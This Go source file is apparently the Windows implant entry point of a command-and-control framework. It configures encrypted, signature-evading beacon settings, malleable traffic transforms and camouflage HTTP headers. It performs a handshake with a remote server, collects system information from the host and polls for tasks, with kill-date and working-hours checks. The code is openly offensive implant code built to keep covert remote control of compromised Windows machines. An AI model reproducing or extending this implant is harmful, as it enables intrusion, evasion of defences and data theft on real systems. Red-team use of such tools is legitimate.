// server/docker/payloads/Windows/main.go

//go:build windows
// +build windows

package main

import (
	"fmt"
	// "log"
	"os"
	"sync"
	"time"
)

// Environment variables set during build
var (
	// Non-encrypted values
	cfgKey   string
	clientID string // This is now used as both initial and current client ID
	sleep    string
	jitter   string

	// Encrypted values
	userAgent          string
	contentType        string
	customHeaders      string
	getRoute           string
	postRoute          string
	getMethod          string // Custom HTTP method for GET operations
	postMethod         string // Custom HTTP method for POST operations
	getClientIDName    string
	getClientIDFormat  string
	postClientIDName   string
	postClientIDFormat string
	postSecretName     string
	postSecretFormat   string
	publicKey          string
	secret             string
	protocol           string
	ip                 string
	port               string

	// Malleable transform config (JSON-encoded DataBlocks)
	getClientIDTransforms  string // DataBlock for GET clientID placement/transforms
	postClientIDTransforms string // DataBlock for POST clientID placement/transforms
	postDataTransforms     string // DataBlock for POST body data transforms
	responseDataTransforms string // DataBlock for parsing server response transforms

	// HTTP header names (encrypted to avoid static signatures)
	httpHeaderUserAgent   string // User-Agent
	httpHeaderContentType string // Content-Type
	httpHeaderPadPre      string // X-Cache-Seq
	httpHeaderPadApp      string // X-Cache-Idx
	httpMetaId            string // id
	httpMetaEncryption    string // encryption
	httpEncRsaAes         string // rsa+aes
)

// Global ConnMgr instance
var handshakeManager *ConnMgr

var clientIDMu sync.RWMutex

func getClientID() string {
	clientIDMu.RLock()
	defer clientIDMu.RUnlock()
	return clientID
}

func setClientID(id string) {
	clientIDMu.Lock()
	defer clientIDMu.Unlock()
	clientID = id
}

func main() {
	if !performSafetyChecks() {
		debugSafetyChecks()
		os.Exit(1)
	}

	var err error
	handshakeManager, err = newHandshakeManager()
	if err != nil {
		os.Exit(1)
	}

	handshakeManager.setClientID(getClientID())

	if err := handshakeManager.performHandshake(); err != nil {
		for retries := 1; retries <= 3; retries++ {
			time.Sleep(time.Duration(retries) * 5 * time.Second)
			if err := handshakeManager.performHandshake(); err == nil {
				break
			} else if retries == 3 {
				os.Exit(1)
			}
		}
	}

	setClientID(handshakeManager.getCurrentClientID())
	getURL, postURL := handshakeManager.getCurrentURLs()

	sysInfoReport, err := collectSystemInfo(getClientID())
	if err != nil {
	}

	pollConfig := SyncConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	if err := startPolling(pollConfig, sysInfoReport); err != nil {
	}

	select {}
}

// refreshHandshake performs a new handshake when needed
func refreshHandshake() error {
	// Before refreshing, check if safety conditions still apply
	// This is important for long-running payloads that might exceed working hours
	// or hit a kill date during execution
	if !performSafetyChecks() {
		// Gracefully stop polling and exit
		stopPolling()
		os.Exit(1)
	}


	// Stop existing polling before starting handshake
	stopPolling()

	// Perform new handshake (this will NOT start polling anymore)
	if err := handshakeManager.refreshHandshake(); err != nil {
		return err
	}

	// Update global clientID after successful refresh
	setClientID(handshakeManager.getCurrentClientID())

	// Get current URLs for logging
	getURL, postURL := handshakeManager.getCurrentURLs()

	// Collect system info for new polling session
	sysInfoReport, err := collectSystemInfo(getClientID())
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Initialize new polling config
	pollConfig := SyncConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	// Start new polling with updated configuration
	if err := startPolling(pollConfig, sysInfoReport); err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	return nil
}

// debugSafetyChecks is a helper function for testing safety checks during development
// Stripped in production builds
func debugSafetyChecks() {
	// Debug output removed for production
}
